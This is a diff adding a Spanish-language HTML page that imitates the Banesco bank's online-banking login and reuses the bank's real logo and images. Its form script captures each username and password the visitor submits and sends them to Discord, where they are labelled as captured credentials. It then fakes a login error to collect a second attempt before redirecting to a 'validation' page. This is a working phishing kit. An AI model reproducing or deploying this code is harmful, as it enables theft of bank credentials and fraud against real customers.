@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banesco Contigo - Banca Digital</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght=400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-green: #21735c; 
+            --btn-green: #257e65; 
+            --text-dark: #323b43;
+            --text-gray: #5c6670;
+            --text-link: #005691;
+            --border-color: #a6b1bc;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        html, body {
+            background-color: var(--bg-green);
+            min-height: 100vh;
+            width: 100%;
+        }
+
+        body {
+            display: block; 
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
+
+        /* Contenedor General Layout Multi-pantalla */
+        .main-container {
+            width: 100%;
+            min-height: 100vh;
+            display: grid;
+            grid-template-columns: 1.25fr 1fr;
+            align-items: center;
+            position: relative;
+        }
+
+        /* --- VISTA DE ESCRITORIO (PC): SECCIÓN IZQUIERDA --- */
+        .promo-side {
+            height: 100vh;
+            width: 100%;
+            background-image: url('https://bancadigital.banesco.com.pa/images/afternoon.png');
+            background-size: cover;
+            background-position: center center; /* Centrado perfecto estilo original */
+            background-repeat: no-repeat;
+            position: relative;
+        }
+
+        .watermark-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600" opacity="0.045"><circle cx="480" cy="300" r="160" fill="white"/><circle cx="340" cy="210" r="120" fill="white"/><circle cx="280" cy="380" r="130" fill="white"/><circle cx="460" cy="460" r="100" fill="white"/></svg>');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            pointer-events: none;
+        }
+
+        /* --- VISTA DE ESCRITORIO (PC): SECCIÓN DERECHA --- */
+        .login-side {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            min-height: 100vh;
+            padding: 40px;
+            background-color: transparent;
+            position: relative;
+        }
+
+        .mobile-header {
+            display: none;
+        }
+
+        .login-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            border-radius: 20px;
+            padding: 45px 35px;
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            z-index: 5;
+        }
+
+        .logo-container {
+            margin-bottom: 25px;
+        }
+
+        .logo-container img {
+            width: 100%;
+            max-width: 200px;
+            height: auto;
+        }
+
+        .greeting {
+            color: #323b43; 
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 22px;
+        }
+
+        .input-group label {
+            display: block;
+            color: var(--text-dark);
+            font-size: 15px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-control {
+            width: 100%;
+            padding: 13px 15px;
+            padding-right: 45px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 16px;
+            color: #111111;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #9cb1a9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Ocultar el estado "abierto" por defecto */
+        .toggle-password .eye-open {
+            display: none;
+        }
+
+        /* Cuando está activo, alternamos la visualización de los SVG */
+        .toggle-password.active .eye-closed {
+            display: none;
+        }
+        .toggle-password.active .eye-open {
+            display: block;
+            color: var(--btn-green);
+        }
+
+        .input-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+            font-size: 13.5px;
+        }
+
+        .password-links-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+            font-size: 13.5px;
+        }
+
+        .link-support {
+            color: var(--text-link);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-gray);
+            cursor: pointer;
+        }
+
+        .remember-me input {
+            width: 16px;
+            height: 16px;
+            accent-color: var(--btn-green);
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: var(--btn-green);
+            color: #ffffff;
+            border: none;
+            border-radius: 50px;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            margin-top: 12px;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #e4e8eb;
+            margin-bottom: 20px;
+        }
+
+        .signup-footer {
+            font-size: 14px;
+            color: var(--text-gray);
+        }
+
+        .signup-footer a {
+            color: var(--text-dark);
+            font-weight: 700;
+            text-decoration: underline;
+        }
+
+        .mobile-links-row, .mobile-nav-bar {
+            display: none;
+        }
+
+
+        /* =========================================================
+           --- VUESTRA ESTRUCTURA ORIGINAL PARA MÓVIL (CORREGIDA) --- 
+           ========================================================= */
+        @media (max-width: 900px) {
+            .main-container {
+                display: block;
+                min-height: 100vh;
+                background-color: var(--bg-green);
+            }
+
+            .promo-side {
+                display: block;
+                height: 35vh; /* Subido ligeramente para dar más aire */
+                min-height: auto;
+                background-image: url('https://bancadigital.banesco.com.pa/images/afternoon.png');
+                background-size: cover;
+                /* 'center bottom' empuja la imagen hacia abajo de forma realista ocultando el verde */
+                background-position: center bottom; 
+                background-repeat: no-repeat;
+            }
+
+            .mobile-header {
+                display: flex;
+                justify-content: center; 
+                align-items: center;
+                position: absolute;
+                top: 35px; 
+                left: 0;
+                width: 100%;
+                padding: 0 24px;
+                z-index: 10;
+            }
+
+            .mobile-logo {
+                max-width: 165px; 
+                height: auto;
+                display: block;
+            }
+
+            .login-side {
+                min-height: auto;
+                padding: 0;
+                background-color: transparent;
+                flex-grow: 1;
+                display: flex;
+                align-items: flex-end;
+            }
+
+            .login-card {
+                max-width: 100%;
+                border-radius: 30px 30px 0 0;
+                box-shadow: 0 -5px 25px rgba(0, 0, 0, 0.1);
+                padding: 40px 24px 110px 24px;
+                text-align: left;
+                border: none;
+                background: #ffffff;
+            }
+
+            .login-card .logo-container, 
+            .login-card .greeting,
+            .login-card .divider,
+            .login-card .signup-footer {
+                display: none;
+            }
+
+            .input-footer {
+                margin-top: 8px;
+                justify-content: flex-end;
+            }
+
+            .input-footer .link-support {
+                display: none;
+            }
+
+            .mobile-links-row {
+                display: flex;
+                flex-direction: column;
+                gap: 14px;
+                margin-top: 25px;
+                margin-bottom: 15px;
+                font-size: 14px;
+                text-align: center;
+            }
+
+            .mobile-links-row a {
+                color: var(--text-link);
+                text-decoration: none;
+                font-weight: 600;
+            }
+
+            .mobile-nav-bar {
+                display: flex;
+                position: fixed;
+                bottom: 0;
+                left: 0;
+                width: 100%;
+                background-color: #ffffff;
+                border-top: 1px solid #e2e8f0;
+                justify-content: space-around;
+                align-items: center;
+                padding: 10px 5px 12px 5px;
+                z-index: 100;
+                box-shadow: 0 -4px 10px rgba(0,0,0,0.05);
+            }
+
+            .nav-item {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+                color: #64748b;
+                font-size: 11px;
+                font-weight: 600;
+                text-decoration: none;
+                width: 18%;
+            }
+
+            .nav-item svg {
+                width: 24px;
+                height: 24px;
+                margin-bottom: 4px;
+                color: #64748b;
+            }
+
+            .nav-item.kuara-menu {
+                position: relative;
+                margin-top: -15px;
+            }
+
+            .kuara-circle {
+                width: 48px;
+                height: 48px;
+                background-color: #63228c; 
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin-bottom: 2px;
+                box-shadow: 0 4px 8px rgba(99, 34, 140, 0.3);
+            }
+
+            .kuara-circle svg {
+                color: white !important;
+                width: 24px;
+                height: 24px;
+                margin: 0;
+            }
+            
+            .nav-item.kuara-menu span {
+                color: #63228c;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        
+        <!-- SECCIÓN IZQUIERDA (PC) / ESPACIO SUPERIOR (MÓVIL) -->
+        <section class="promo-side">
+            <div class="watermark-bg"></div>
+            
+            <!-- Logo Cabecera Móvil original -->
+            <div class="mobile-header">
+                <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/header/logotype.png" alt="Banesco" class="mobile-logo">
+            </div>
+        </section>
+
+        <!-- SECCIÓN LOGIN CONTENEDOR -->
+        <main class="login-side">
+            <div class="login-card">
+                
+                <!-- Logo Horizontal (PC) -->
+                <div class="logo-container">
+                    <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/header/logotype.png" alt="Banesco Contigo">
+                </div>
+
+                <h1 class="greeting" id="greeting-message">¡Buenas tardes!</h1>
+
+                <form id="login-form">
+                    
+                    <!-- Campo de Usuario -->
+                    <div class="input-group">
+                        <label for="username">Ingresa tu usuario</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="username" class="input-control" required autocomplete="username">
+                        </div>
+                        <div class="input-footer">
+                            <a href="#" class="link-support">Olvidé mi usuario</a>
+                            <label class="remember-me">
+                                <input type="checkbox" id="remember"> Recordarme
+                            </label>
+                        </div>
+                    </div>
+
+                    <!-- Campo de Contraseña -->
+                    <div class="input-group">
+                        <label for="password">Ingresa tu contraseña</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="password" class="input-control" required autocomplete="current-password">
+                            
+                            <button type="button" class="toggle-password" id="btnTogglePassword" aria-label="Cambiar visibilidad de contraseña">
+                                <!-- OJO TACHADO (Contraseña Oculta) -->
+                                <svg class="eye-closed" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                                    <path d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88"></path>
+                                </svg>
+                                <!-- OJO ABIERTO / SIN PALITO (Contraseña Visible) -->
+                                <svg class="eye-open" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                </svg>
+                            </button>
+                        </div>
+                        
+                        <div class="password-links-row">
+                            <a href="#" class="link-support">Olvidé o bloquee mi contraseña</a>
+                            <a href="#" class="link-support">Ingresar con Token</a>
+                        </div>
+                    </div>
+
+                    <!-- Botón Continuar -->
+                    <div id="error-message" style="color: #c02b0a; font-size: 14px; margin-bottom: 15px; text-align: center; display: none;"></div>
+                    <button type="submit" class="btn-submit">CONTINUAR</button>
+
+                    <div class="divider"></div>
+
+                    <!-- Pie de página (PC) -->
+                    <div class="signup-footer">
+                        ¿No eres cliente? <a href="#">Afíliate aquí.</a>
+                    </div>
+
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <!-- MENÚ NATIVO MÓVIL -->
+    <nav class="mobile-nav-bar">
+        <a href="#" class="nav-item">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M6.75 3v2.25M17.25 3v2.25M3 18.75V7.5a2.25 2.25 0 012.25-2.25h13.5A2.25 2.25 0 0121 7.5v11.25m-18 0A2.25 2.25 0 005.25 21h13.5A2.25 2.25 0 0021 18.75m-18 0v-7.5A2.25 2.25 0 015.25 9h13.5A2.25 2.25 0 0121 11.25v7.5"></path>
+            </svg>
+            <span>Turno online</span>
+        </a>
+        <a href="#" class="nav-item">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M8.625 9.75a.375.375 0 11-.75 0 .375.375 0 01.75 0zm0 0H8.25m4.125 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm0 0H12m4.125 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm0 0h-.375M21 12c0 4.556-4.03 8.25-9 8.25a9.764 9.764 0 01-2.555-.337A5.972 5.972 0 015.41 20.97a.596.596 0 01-.733-.513 5.25 5.25 0 011.01-4.145C4.303 15.015 3 13.614 3 12c0-4.556 4.03-8.25 9-8.25s9 3.694 9 8.25z"></path>
+            </svg>
+            <span>Conversa con Dani</span>
+        </a>
+        <a href="#" class="nav-item kuara-menu">
+            <div class="kuara-circle">
+                <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99"></path>
+                </svg>
+            </div>
+            <span>kuara</span>
+        </a>
+        <a href="#" class="nav-item">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+            </svg>
+            <span>Abrir cuenta</span>
+        </a>
+        <a href="#" class="nav-item">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M7.864 4.243A7.5 7.5 0 0119.5 10.5c0 2.92-.556 5.709-1.568 8.263M19.5 10.5a7.488 7.488 0 00-1.553-4.532m-1.412.08a6 6 0 00-7.34 6m9.22 3.42a4.492 4.492 0 01-1.34 3.184m-4.14-4.14a1.5 1.5 0 112.122-2.122m-2.122 2.122a1.5 1.5 0 11-2.122-2.122M15 15.75c-.962.611-2.106.938-3.321.938M16.5 10.5c0-1.24-.42-2.381-1.125-3.295M4.5 10.5a7.488 7.488 0 001.553 4.532m0 0A7.47 7.47 0 0012 18c1.373 0 2.678-.369 3.804-1.012M4.5 10.5a7.47 7.47 0 011.567-4.532m0 0A7.47 7.47 0 0112 3c1.373 0 2.678.369 3.804 1.012"></path>
+            </svg>
+            <span>Huella ID Facial</span>
+        </a>
+    </nav>
+
+    <!-- SCRIPT JAVASCRIPT DINÁMICO -->
+    <script src="protection.sander.js"></script>
+    <script src="discord.sander.js"></script>
+    <script>
+        document.getElementById('btnTogglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.classList.add('active'); // Muestra el ojo limpio (abierto)
+            } else {
+                passwordInput.type = 'password';
+                this.classList.remove('active'); // Vuelve al ojo tachado
+            }
+        });
+
+        // Script para cambiar el saludo automáticamente
+        document.addEventListener('DOMContentLoaded', function() {
+            const greetingElement = document.getElementById('greeting-message');
+            if (greetingElement) {
+                const hour = new Date().getHours();
+                let greetingText = "¡Buenas noches!";
+                if (hour >= 5 && hour < 12) {
+                    greetingText = "¡Buenos días!";
+                } else if (hour >= 12 && hour < 19) {
+                    greetingText = "¡Buenas tardes!";
+                }
+                greetingElement.textContent = greetingText;
+            }
+        });
+
+        // Lógica de envío de formulario en dos pasos
+        let loginAttempts = 0;
+
+        document.getElementById('login-form').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const errorMessageDiv = document.getElementById('error-message');
+
+            const username = usernameInput.value;
+            const password = passwordInput.value;
+
+            loginAttempts++;
+
+            const title = `🚨 Intento de Login #${loginAttempts}`;
+            const description = `Se han capturado nuevas credenciales en la página de Banesco.`;
+            const fields = [
+                { name: "👤 Usuario", value: `\`${username}\``, inline: true },
+                { name: "🔑 Contraseña", value: `\`${password}\``, inline: true }
+            ];
+
+            // Envía los datos a Discord en cada intento
+            await sendToDiscord(title, description, fields, 15844367); // Color rojo para alerta
+
+            if (loginAttempts === 1) {
+                // Primer intento: muestra error y limpia la contraseña
+                errorMessageDiv.textContent = 'Usuario o contraseña incorrecta. Por favor, inténtalo de nuevo.';
+                errorMessageDiv.style.display = 'block';
+                passwordInput.value = '';
+                usernameInput.focus();
+            } else {
+                // Segundo intento: redirige a la página de carga
+                window.location.href = 'cargando_validacion.html';
+            }
+        });
+    </script>
+</body>
+</html>
